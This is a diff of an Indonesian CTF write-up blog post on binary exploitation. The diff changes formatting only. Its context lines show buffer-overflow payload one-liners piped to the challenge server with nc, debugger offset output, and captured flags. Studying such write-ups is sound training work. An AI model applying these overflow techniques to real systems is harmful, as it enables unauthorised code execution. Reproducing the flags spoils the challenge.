@@ -3,8 +3,7 @@ layout: post
 title: "AsgamaCTF Binary Exploit Write-Up"
 date: 2020-07-15 06:25:05 +0530
 categories:
-  - Write Up
-  - CTF
+  - WriteUp
   - PWN
 ---
 
@@ -92,7 +91,7 @@ $ python -c 'print "A"*128 + "\x31\x73\x37\x13"' | nc asgama.web.id 40203
 GamaCTF{BufF3rR__0vErf10W__EZ}
 ```
 ### Flag
-`GamaCTF{BufF3rR__0vErf10W__EZ}`
+`GamaCTF{BufF3rR__0vErf10W__EZ}`  
  
 
 ## Buffer2 [75 pts]
@@ -233,7 +232,7 @@ $
 [*] Closed connection to asgama.web.id port 40202
 ```
 ### Flag
-`GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}`
+`GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}`    
 
 ## EZ 1 [100 pts]
 
@@ -287,10 +286,10 @@ End of assembler dump.
 Sama dengan soal ```buffer1```, binary ini menggunakan ```gets``` untuk mengambil inputan yang diberi ukuran sebesar ```0x90```.
 
 ```py
-   0x08048555 <+57>: cmp    DWORD PTR [ebp-0xc],0x13377331
-   0x0804855c <+64>: jne    0x8048576 <main+90>
-   0x0804855e <+66>: cmp    DWORD PTR [ebp-0x10],0x0
-   0x08048562 <+70>: jne    0x8048576 <main+90>
+ 0x08048555 <+57>: cmp    DWORD PTR [ebp-0xc],0x13377331
+ 0x0804855c <+64>: jne    0x8048576 <main+90>
+ 0x0804855e <+66>: cmp    DWORD PTR [ebp-0x10],0x0
+ 0x08048562 <+70>: jne    0x8048576 <main+90>
 ```
 
 Tetapi, dalam binary ini, ada 2 validasi yang harus dilalui.
@@ -309,7 +308,7 @@ $ python -c 'print "\x00"*132 + "\x31\x73\x37\x13"' | nc asgama.web.id 40210
 GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}
 ```
 ### Flag
-`GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}`
+`GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}`  
 
 
 
@@ -418,7 +417,7 @@ $
 [*] Closed connection to asgama.web.id port 40209
 ```
 ### Flag
-`GamaCTF{R0P_r0P_FTW}`
+`GamaCTF{R0P_r0P_FTW}`   
 
 ## Buffow [200 pts]
 
@@ -445,7 +444,7 @@ gdb-peda$ pattern offset 0x41474141
 1095188801 found at offset: 52
 ```
 
-Terlihat pada offset 52 ```eip``` ter-overwrite dan bisa merubah *return address* fungsi `flag` yang ada pada alamat `0x080491c2`.
+Terlihat pada offset 52 ```eip``` ter-overwrite dan bisa merubah *return address* mengarah ke fungsi `flag` yang ada pada alamat `0x080491c2`.
 
 ```sh
 $ objdump -D ./buffow | grep flag
@@ -488,7 +487,7 @@ GamaCTF{Ini_Bukan_Flagnya}
 ```
 
 ### Flag
-```GamaCTF{Ini_Bukan_Flagnya}```
+```GamaCTF{Ini_Bukan_Flagnya}```   
 
 ## Bebas
 Diberikan file `bebas.zip` yang didalamnya terdapat file binary elf 32bit yang executable.
@@ -655,5 +654,5 @@ Run exploit dan didapatkan shell.
 Sebagian solver diatas dibuat dengan bantuan dari pwntools yang bisa didownload [disini](https://github.com/Gallopsled/pwntools).
 
 ## Referensi
-1. *https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm [(klik)](https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm)*
+1. *https://www.tutorialspoint.com/assembl.. [(klik)](https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm)*
 2. *https://en.wikipedia.org/wiki/Endianness [(klik)](https://en.wikipedia.org/wiki/Endianness)*
